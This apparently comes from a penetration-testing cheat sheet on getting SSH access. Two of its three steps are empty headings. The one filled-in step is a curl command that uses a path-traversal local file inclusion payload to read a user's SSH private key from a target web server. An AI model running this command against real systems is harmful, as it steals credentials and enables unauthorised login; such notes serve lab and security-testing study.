# SSH

You canâ€™t get initial access directly however we can login with user and password and private key.

#### 1) Login with credentials

#### 2) Get ssh private key via LFI (example)

    curl http://<ip>/index.php?page=../../../../../../../../../home/noman/.ssh/id_rsa

#### 3) Give permissions on key
